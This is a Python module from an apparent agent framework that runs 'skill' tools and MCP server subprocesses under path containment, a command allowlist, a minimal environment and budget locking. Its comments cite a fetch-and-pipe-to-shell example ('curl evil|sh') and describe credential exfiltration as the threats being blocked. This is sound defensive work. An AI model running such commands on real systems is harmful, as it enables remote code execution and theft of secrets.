"""Skill tool execution - runs Python and MCP tools with budget tracking.

Security model for skill execution:

- ``python`` tools resolve ``module`` to a ``.py`` file under the skill's own
  directory via ``importlib.util.spec_from_file_location``. Dotted module
  names like ``os`` or ``subprocess`` are NOT importable - modules must live
  inside the skill. We never modify ``sys.path``.
- ``function`` names must be public identifiers; dunder/underscore-prefixed
  names are refused to block ``__import__`` / ``__class__.__subclasses__``
  style escapes via tool arguments.
- ``mcp`` tools require ``server_command`` to be on a per-skill allowlist
  (built-in skills only - community skills must opt in explicitly via
  ``DEEPR_SKILL_ALLOW_MCP_COMMANDS=*`` or a comma-list). We do NOT merge the
  full host env into the subprocess; only env keys listed in ``server.env``
  are passed through, with ``${VAR}`` substitution from ``os.environ``.
- Concurrent calls into the same ``SkillExecutor`` instance are serialised
  through an ``asyncio.Lock`` around budget check + deduction so two
  parallel callers cannot both pass a budget check on stale state.

These are last-line defences; the install path (``manager.install``) is the
correct place to require signatures + interactive confirmation for
non-built-in skills.
"""

from __future__ import annotations

import asyncio
import importlib.util
import json
import logging
import math
import os
import re
import sys
from collections.abc import Callable
from pathlib import Path
from typing import Any

from deepr.experts.skills.definition import SkillDefinition, SkillTool

logger = logging.getLogger(__name__)

# Estimated costs by tier (used when actual cost is unknown)
_COST_TIER_ESTIMATES = {
    "free": 0.0,
    "low": 0.01,
    "medium": 0.05,
    "high": 0.20,
}


def _tool_properties(tool: SkillTool) -> dict[str, Any]:
    """Return parameter properties from JSON Schema or legacy skill YAML."""
    parameters = tool.parameters or {}
    nested = parameters.get("properties")
    return nested if isinstance(nested, dict) else parameters


# Public-identifier regex for skill ``function`` names. Blocks dunder
# attribute escapes (``__import__``, ``__class__``) and underscore-prefixed
# private members.
_PYTHON_IDENTIFIER = re.compile(r"^[A-Za-z][A-Za-z0-9_]*$")

# Default allowlist of subprocess executables that built-in skills may spawn
# as MCP servers. Community skills installed without explicit allowlisting
# may NOT spawn arbitrary subprocesses. Set
# ``DEEPR_SKILL_ALLOW_MCP_COMMANDS=*`` to opt out (not recommended) or pass
# a comma-separated list of paths/binaries to allow.
_BUILTIN_MCP_COMMAND_ALLOWLIST: frozenset[str] = frozenset(
    {
        # Python interpreter for skill-bundled MCP servers
        "python",
        "python3",
        sys.executable,
        # Node-based MCP servers (npx-distributed)
        "npx",
        "node",
        # First-party native instruments (auto-discovered when installed)
        "recon",  # from pip install recon-tool (passive domain intel MCP server)
        "distill-mcp",  # from pip install distillr (source ingestion MCP server)
        "primr-mcp",  # from pip install primr (strategic company intel MCP server)
    }
)


def _mcp_command_allowed(command: str) -> bool:
    """Return True if ``command`` is allowed as an MCP server subprocess.

    Honours ``DEEPR_SKILL_ALLOW_MCP_COMMANDS`` env var:
    - unset / empty: only the built-in allowlist is permitted.
    - ``*``: every command is allowed (opt-in, dangerous).
    - comma-separated list: those commands are permitted in addition to
      the built-in allowlist.
    """
    extra = os.environ.get("DEEPR_SKILL_ALLOW_MCP_COMMANDS", "").strip()
    if extra == "*":
        return True
    allowed = set(_BUILTIN_MCP_COMMAND_ALLOWLIST)
    if extra:
        allowed |= {entry.strip() for entry in extra.split(",") if entry.strip()}
    # Match either basename (``npx``) or absolute path entry.
    return command in allowed or Path(command).name in allowed


class MCPClientProxy:
    """Spawns an MCP server subprocess and sends tool calls via JSON-RPC stdio."""

    def __init__(self, command: str, args: list[str], env: dict[str, str]):
        self._command = command
        self._args = args
        # Do NOT blanket-merge os.environ into the child. Only pass the
        # exact keys the manifest declared, with ${VAR} substitution from
        # os.environ. A malicious manifest with command="/bin/sh" would
        # otherwise inherit OPENAI_API_KEY, AWS_*, etc., and could
        # exfiltrate them.
        resolved = self._resolve_env(env)
        # Provide the minimal env any subprocess needs to start: PATH so
        # the executable can be located, and HOME/USERPROFILE for
        # well-behaved tools that read config files. Skill yaml controls
        # everything else.
        minimal_keys = ("PATH", "HOME", "USERPROFILE", "SYSTEMROOT", "TEMP", "TMP", "LANG", "LC_ALL")
        base = {k: os.environ[k] for k in minimal_keys if k in os.environ}
        self._env = {**base, **resolved}
        self._process: asyncio.subprocess.Process | None = None
        self._request_id = 0
        self._stderr_task: asyncio.Task[None] | None = None

    @staticmethod
    def _resolve_env(env: dict[str, str]) -> dict[str, str]:
        """Resolve ${VAR} references in env values from os.environ."""
        resolved = {}
        for key, value in env.items():
            if isinstance(value, str) and value.startswith("${") and value.endswith("}"):
                env_var = value[2:-1]
                resolved[key] = os.environ.get(env_var, "")
            else:
                resolved[key] = str(value)
        return resolved

    async def _ensure_started(self) -> asyncio.subprocess.Process:
        if self._process is None or self._process.returncode is not None:
            self._process = await asyncio.create_subprocess_exec(
                self._command,
                *self._args,
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                env=self._env,
            )
            # Drain stderr to logger so the ~64KB pipe buffer never
            # fills up and blocks the subprocess. A chatty MCP server
            # would otherwise hang the executor on its next write.
            self._stderr_task = asyncio.create_task(self._drain_stderr())
            # Send initialize handshake
            await self._send_jsonrpc(
                "initialize",
                {
                    "protocolVersion": "2024-11-05",
                    "capabilities": {},
                    "clientInfo": {"name": "deepr-skill", "version": "1.0.0"},
                },
            )
        return self._process

    async def _drain_stderr(self) -> None:
        """Continuously drain stderr to logger. Exits on EOF or cancellation."""
        if not self._process or not self._process.stderr:
            return
        # Only drain if stderr is an actual StreamReader. AsyncMock test
        # harnesses synthesise every attribute on access, so a real-type
        # check is required to avoid hanging the test event loop.
        if not isinstance(self._process.stderr, asyncio.StreamReader):
            return
        try:
            while True:
                if self._process.returncode is not None:
                    return
                try:
                    line = await asyncio.wait_for(self._process.stderr.readline(), timeout=1.0)
                except TimeoutError:
                    continue
                if not line:
                    return
                try:
                    text = line.decode("utf-8", errors="replace").rstrip()
                except Exception:
                    text = repr(line)
                if text:
                    logger.debug("[skill-mcp:%s stderr] %s", self._command, text)
        except asyncio.CancelledError:
            raise
        except Exception:
            # Intent: any unexpected error in background stderr drain for external MCP skill process; task exits cleanly, skill session continues.
            return

    async def _send_jsonrpc(self, method: str, params: dict[str, Any]) -> dict[str, Any]:
        """Send a JSON-RPC request and read the response."""
        proc = await self._ensure_started() if self._process is None else self._process
        if proc is None or proc.stdin is None or proc.stdout is None:
            return {"error": "MCP process not available"}

        self._request_id += 1
        request = {
            "jsonrpc": "2.0",
            "id": self._request_id,
            "method": method,
            "params": params,
        }
        line = json.dumps(request) + "\n"
        proc.stdin.write(line.encode())
        await proc.stdin.drain()

        # Read response line
        response_line = await proc.stdout.readline()
        if not response_line:
            return {"error": "MCP server closed connection"}

        try:
            decoded = json.loads(response_line)
            return decoded if isinstance(decoded, dict) else {"error": "MCP server returned a non-object response"}
        except json.JSONDecodeError:
            return {"error": f"Invalid JSON from MCP server: {response_line[:200]!r}"}

    async def call_tool(self, tool_name: str, arguments: dict[str, Any], timeout: int = 30) -> dict[str, Any]:
        """Call a tool on the MCP server.

        Args:
            tool_name: Name of the tool on the remote server
            arguments: Tool arguments
            timeout: Timeout in seconds

        Returns:
            dict with 'result' or 'error' key
        """
        try:
            await self._ensure_started()
            response = await asyncio.wait_for(
                self._send_jsonrpc(
                    "tools/call",
                    {
                        "name": tool_name,
                        "arguments": arguments,
                    },
                ),
                timeout=timeout,
            )

            if "error" in response:
                return {"error": response["error"]}

            result = response.get("result", {})
            if not isinstance(result, dict):
                return {"result": result}
            reported_cost = result.get("cost")
            structured = result.get("structuredContent")
            if reported_cost is None and isinstance(structured, dict):
                reported_cost = structured.get("cost")
            # MCP tools return content array
            content = result.get("content", [])
            if content and isinstance(content, list):
                text_parts = [c.get("text", "") for c in content if c.get("type") == "text"]
                output: dict[str, Any] = {"result": "\n".join(text_parts)}
            else:
                output = {"result": structured if isinstance(structured, dict) else result}
            if reported_cost is not None:
                output["cost"] = reported_cost
            return output

        except TimeoutError:
            raise TimeoutError(f"MCP tool '{tool_name}' timed out after {timeout}s") from None
        except (asyncio.CancelledError, SystemExit, KeyboardInterrupt):
            # Fatal / cancellation signals must always propagate; never swallow.
            raise
        except Exception as e:
            # Broad except is required here: third-party MCP servers (e.g. recon-tool,
            # community skills) can return arbitrary error shapes or transport failures.
            # We surface a safe error string to the caller (expert turn or CLI) and
            # let the budget / circuit-breaker logic decide whether to continue.
            # This mirrors the fail-closed pattern used in doc_reviewer and MCP client.
            return {"error": f"MCP error: {e}"}

    async def close(self) -> None:
        """Terminate the MCP server subprocess and stop draining stderr."""
        if self._stderr_task and not self._stderr_task.done():
            self._stderr_task.cancel()
        self._stderr_task = None
        if self._process and self._process.returncode is None:
            self._process.terminate()
            try:
                await asyncio.wait_for(self._process.wait(), timeout=5)
            except TimeoutError:
                self._process.kill()
                try:
                    await asyncio.wait_for(self._process.wait(), timeout=2)
                except TimeoutError:
                    pass
            self._process = None


class SkillExecutor:
    """Executes skill tools with budget tracking."""

    def __init__(
        self,
        skill: SkillDefinition,
        budget_remaining: float,
        *,
        allow_metered_tools: bool = False,
    ) -> None:
        # Fail closed: paid tools require an explicit opt-in. Live expert chat
        # always passes False; deliberate CLI/operator runs may pass True and
        # then hit durable reserve/mark/settle.
        if (
            isinstance(budget_remaining, bool)
            or not isinstance(budget_remaining, (int, float))
            or not math.isfinite(budget_remaining)
            or budget_remaining < 0
        ):
            raise ValueError("budget_remaining must be a finite non-negative number")
        self._skill = skill
        self._budget_remaining = float(budget_remaining)
        self._allow_metered_tools = allow_metered_tools
        self._mcp_proxies: dict[str, MCPClientProxy] = {}
        self._tool_map: dict[str, SkillTool] = {t.name: t for t in skill.tools}
        # Serialise budget check + deduction so two parallel ``execute_tool``
        # callers can't both pass a check against the same stale value
        # and produce a negative budget. Also guards ``_mcp_proxies``
        # creation against duplicate-spawn races.
        self._lock = asyncio.Lock()
        # In-flight holds (not yet settled). Concurrent callers subtract these
        # from remaining without mutating ``_budget_remaining`` so MCP budget
        # arg clamps still see the true pre-call remaining for this tool.
        self._held_budget = 0.0

    async def execute_tool(self, tool_name: str, arguments: dict[str, Any]) -> dict[str, Any]:
        """Route to Python or MCP execution. Check budget first.

        Returns:
            dict with 'result' and 'cost', or 'error' and 'cost'
        """
        tool = self._tool_map.get(tool_name)
        if not tool:
            return {"error": f"Unknown tool: {tool_name}", "cost": 0.0}

        # Budget check inside the lock so a parallel caller cannot
        # observe the same ``_budget_remaining`` snapshot.
        # Unknown tiers fail closed as high rather than free (definition also
        # normalizes on load; this covers hand-built SkillTool instances).
        estimated_cost = _COST_TIER_ESTIMATES.get(tool.cost_tier)
        if estimated_cost is None:
            estimated_cost = 0.0 if tool.cost_tier in {"", "free", None} else _COST_TIER_ESTIMATES["high"]
        tool_props = _tool_properties(tool)
        declares_budget = tool.type == "mcp" and "budget" in tool_props
        is_metered = estimated_cost > 0 or declares_budget
        if is_metered and not self._allow_metered_tools:
            return {
                "error": "METERED_SKILL_TOOL_DISABLED",
                "status": "blocked",
                "detail": (
                    "Metered skill tools are unavailable inside live expert chat "
                    "until durable accounting is re-enabled with explicit confirmation."
                ),
                "cost": 0.0,
            }
        # Reserve the estimate under the lock so concurrent callers cannot
        # both pass the same remaining-budget snapshot, then execute outside
        # the lock. Holds live in ``_held_budget`` so clamp logic still sees
        # pre-call remaining; settle actual only after success.
        hold = 0.0
        prepared_arguments = dict(arguments)
        async with self._lock:
            available = self._budget_remaining - self._held_budget
            authorized_ceiling = float(estimated_cost)
            if declares_budget:
                manifest_cap = float(self._skill.budget.max_per_call)
                if not math.isfinite(manifest_cap) or manifest_cap <= 0:
                    return {
                        "error": "INVALID_TOOL_BUDGET",
                        "status": "blocked",
                        "detail": "Skill max_per_call must be finite and positive",
                        "cost": 0.0,
                    }
                cap = min(manifest_cap, max(0.0, available))
                requested = arguments.get("budget", cap)
                if (
                    isinstance(requested, bool)
                    or not isinstance(requested, (int, float))
                    or not math.isfinite(requested)
                ):
                    return {
                        "error": "INVALID_TOOL_BUDGET",
                        "status": "blocked",
                        "detail": "Tool budget must be a finite number",
                        "cost": 0.0,
                    }
                authorized_ceiling = round(max(0.0, min(float(requested), cap)), 4)
                prepared_arguments["budget"] = authorized_ceiling
            if is_metered and (authorized_ceiling <= 0 or authorized_ceiling > available):
                return {
                    "error": "BUDGET_EXCEEDED",
                    "detail": f"Tool may cost ${authorized_ceiling:.2f} but only ${available:.2f} remains",
                    "cost": 0.0,
                }
            if is_metered:
                hold = authorized_ceiling
                self._held_budget += hold

        settled_cost = 0.0

        def _remember_settlement(cost: float) -> None:
            nonlocal settled_cost
            settled_cost = cost

        try:
            if is_metered:
                result = await self._execute_metered_tool(
                    tool,
                    tool_name,
                    prepared_arguments,
                    authorized_ceiling=hold,
                    on_settled=_remember_settlement,
                )
            elif tool.type == "python":
                result = await self._execute_python(tool, prepared_arguments)
            elif tool.type == "mcp":
                result = await self._execute_mcp(tool, prepared_arguments)
            else:
                result = {"error": f"Unknown tool type: {tool.type}", "cost": 0.0}
        except BaseException:
            if hold:
                async with self._lock:
                    self._held_budget = max(0.0, self._held_budget - hold)
                    self._budget_remaining -= settled_cost
            raise

        # Only charge cost for SUCCESSFUL executions. The previous
        # implementation deducted the tier estimate even when the
        # underlying call returned an ``error``, double-charging users
        # for failed paid tool invocations.
        if "error" in result:
            result["cost"] = 0.0
        actual = settled_cost if is_metered else float(result.get("cost", 0.0) or 0.0)
        result["cost"] = actual
        async with self._lock:
            if hold:
                self._held_budget = max(0.0, self._held_budget - hold)
            self._budget_remaining -= actual
        return result

    async def _execute_metered_tool(
        self,
        tool: SkillTool,
        tool_name: str,
        arguments: dict[str, Any],
        *,
        authorized_ceiling: float,
        on_settled: Callable[[float], None],
    ) -> dict[str, Any]:
        """Run a paid skill tool under durable reserve / mark / settle."""
        from deepr.experts.research_cost_gate import ResearchCostBlocked
        from deepr.services.metered_call import (
            MeteredCallAccountingError,
            execute_reserved_fixed_cost_async_call,
        )

        async def _run() -> dict[str, Any]:
            if tool.type == "python":
                return await self._execute_python(tool, arguments)
            if tool.type == "mcp":
                return await self._execute_mcp(tool, arguments, authorized_cost_ceiling=authorized_ceiling)
            return {"error": f"Unknown tool type: {tool.type}", "cost": 0.0}

        def _cost_from_result(result: dict[str, Any]) -> float:
            if "error" in result:
                return 0.0
            return float(result.get("cost", authorized_ceiling))

        try:
            return await execute_reserved_fixed_cost_async_call(
                operation_prefix="skill-tool",
                provider="skill",
                model=f"{self._skill.name}:{tool_name}",
                source="skill_executor.metered_tool",
                max_cost_per_job=authorized_ceiling,
                call=_run,
                cost_from_result=_cost_from_result,
                on_settled=on_settled,
            )
        except ResearchCostBlocked as exc:
            return {
                "error": "COST_RESERVATION_BLOCKED",
                "status": "blocked",
                "detail": str(exc),
                "cost": 0.0,
            }
        except MeteredCallAccountingError as exc:
            return {
                "error": "METERED_ACCOUNTING_FAILED",
                "status": "blocked",
                "detail": str(exc),
                "cost": 0.0,
            }

    async def _execute_python(self, tool: SkillTool, arguments: dict[str, Any]) -> dict[str, Any]:
        """Import module and call function. Supports sync and async.

        Security:
        - ``tool.module`` must resolve to a ``.py`` file under the skill
          directory. Dotted stdlib references (``os``, ``subprocess``)
          and any path that escapes the skill dir are rejected; we do
          NOT modify ``sys.path``.
        - ``tool.function`` must be a public identifier. Dunder and
          underscore-prefixed names are blocked.
        """
        if not tool.module or not tool.function:
            return {"error": "Python tool missing module/function", "cost": 0.0}
        module_name = tool.module
        function_name = tool.function

        if not _PYTHON_IDENTIFIER.match(function_name):
            return {
                "error": f"Invalid function name {function_name!r}: must be a public Python identifier",
                "cost": 0.0,
            }

        # Resolve the module to a .py file under the skill directory.
        # Run in thread to avoid blocking the event loop (ASYNC240).
        def _validate_skill_path() -> Path | dict[str, Any]:
            skill_root = Path(self._skill.path).resolve()
            relative = module_name.replace(".", "/") + ".py"
            # Reject absolute / parent-traversal module values up front.
            if Path(module_name).is_absolute() or ".." in Path(module_name).parts:
                return {"error": "Module path escapes skill directory", "cost": 0.0}
            candidate = (skill_root / relative).resolve()
            try:
                candidate.relative_to(skill_root)
            except ValueError:
                return {"error": "Module path escapes skill directory", "cost": 0.0}
            # Symlink defense (mirrors doc_reviewer scan): reject before is_file to block
            # symlink-to-outside traversal even if relative_to passes on some filesystems.
            if candidate.is_symlink():
                return {"error": "Module path escapes skill directory (symlink)", "cost": 0.0}
            if candidate.suffix != ".py" or not candidate.is_file():
                return {"error": f"Module {module_name} not found in skill", "cost": 0.0}
            return candidate

        validation = await asyncio.to_thread(_validate_skill_path)
        if isinstance(validation, dict):
            return validation
        candidate = validation

        # Build a unique module qualname so skills shipping a same-named
        # ``tools.py`` cannot collide in ``sys.modules`` cache.
        safe_skill = re.sub(r"[^A-Za-z0-9_]", "_", self._skill.name)
        safe_module = re.sub(r"[^A-Za-z0-9_]", "_", module_name)
        qualname = f"_deepr_skill_{safe_skill}_{safe_module}"

        try:
            spec = importlib.util.spec_from_file_location(qualname, candidate)
            if spec is None or spec.loader is None:
                return {"error": "Failed to load skill module", "cost": 0.0}
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            func = getattr(mod, function_name, None)
            if not callable(func):
                return {"error": f"{module_name}.{function_name} is not callable", "cost": 0.0}

            if asyncio.iscoroutinefunction(func):
                result = await func(**arguments)
            else:
                result = func(**arguments)

            return {"result": result, "cost": 0.0}  # Python tools are free

        except (asyncio.CancelledError, SystemExit, KeyboardInterrupt):
            # Fatal / cancellation signals must always propagate; never swallow.
            raise
        except Exception as e:
            # Broad except is intentional: Python tools execute user- or community-
            # provided code inside the skill directory (after path containment +
            # public-identifier validation). Any exception (including novel ones
            # from the skill) must be turned into a tool error result so the
            # expert turn and budget accounting continue safely.
            # Never let a skill bug crash the parent expert or leak stack traces.
            logger.warning("Python tool %s.%s failed: %s", module_name, function_name, e)
            return {"error": str(e), "cost": 0.0}

    async def _execute_mcp(
        self,
        tool: SkillTool,
        arguments: dict[str, Any],
        *,
        authorized_cost_ceiling: float | None = None,
    ) -> dict[str, Any]:
        """Spawn/reuse MCP server, proxy the call, handle timeout.

        Enforces the subprocess command allowlist - community skills
        cannot run ``/bin/sh -c curl evil|sh`` unless the operator
        explicitly opted in via ``DEEPR_SKILL_ALLOW_MCP_COMMANDS``.
        """
        if not tool.server_command:
            return {"error": "MCP tool missing server command", "cost": 0.0}

        if not _mcp_command_allowed(tool.server_command):
            logger.warning(
                "Refusing to spawn MCP server %r for skill %s - not in allowlist; "
                "set DEEPR_SKILL_ALLOW_MCP_COMMANDS to permit",
                tool.server_command,
                self._skill.name,
            )
            return {
                "error": f"MCP server command {tool.server_command!r} is not allowed for this skill",
                "cost": 0.0,
            }

        tool_props = _tool_properties(tool)
        if "budget" in tool_props:
            if authorized_cost_ceiling is None or arguments.get("budget") != authorized_cost_ceiling:
                return {"error": "MCP tool budget authority is unavailable", "cost": 0.0}

        proxy_key = f"{tool.server_command}:{' '.join(tool.server_args)}"

        # Lock the proxy-spawn so concurrent invocations don't both create
        # a fresh subprocess for the same key and leak one.
        async with self._lock:
            if proxy_key not in self._mcp_proxies:
                self._mcp_proxies[proxy_key] = MCPClientProxy(
                    command=tool.server_command,
                    args=tool.server_args,
                    env=tool.server_env,
                )

        proxy = self._mcp_proxies[proxy_key]
        remote_name = tool.remote_tool_name or tool.name

        result = await proxy.call_tool(remote_name, arguments, timeout=tool.timeout_seconds)

        # Only attach the tier-estimate cost when the call actually
        # succeeded. ``execute_tool`` also enforces this, but tagging
        # here makes intent explicit for any callers that bypass it.
        if "error" in result:
            result["cost"] = 0.0
        elif "cost" not in result:
            result["cost"] = (
                authorized_cost_ceiling
                if authorized_cost_ceiling is not None
                else _COST_TIER_ESTIMATES.get(tool.cost_tier, 0.0)
            )
        return result

    async def cleanup(self) -> None:
        """Terminate all MCP subprocesses."""
        for proxy in self._mcp_proxies.values():
            await proxy.close()
        self._mcp_proxies.clear()
